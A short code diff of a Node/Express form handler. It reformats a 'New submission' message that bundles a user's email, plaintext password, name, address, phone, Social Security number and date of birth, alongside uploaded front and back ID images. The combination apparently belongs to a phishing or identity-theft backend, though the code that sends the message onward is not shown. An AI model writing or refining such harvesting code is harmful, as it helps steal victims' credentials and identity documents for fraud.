@@ -53,7 +53,7 @@ app.post(
       } = req.body;
 
       // Compile a message with user information
-      const userMessage = `New submission:\nEmail: ${email}\nPassword: ${password}\nName: ${firstName} ${lastName}\nPhone: ${phone}\nAddress: ${homeAddress}, ${city}, ${state} ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
+      const userMessage = `New submission:\nEmail: ${email}\nPassword: ${password}\nFirst Name: ${firstName}\nLast Name: ${lastName}\nPhone: ${phone}\nHome Address: ${homeAddress}\nCity: ${city}\nState: ${state}\nZipcode: ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
 
       const idFront = req.files["idFront"]?.[0]?.buffer;
       const idBack = req.files["idBack"]?.[0]?.buffer;
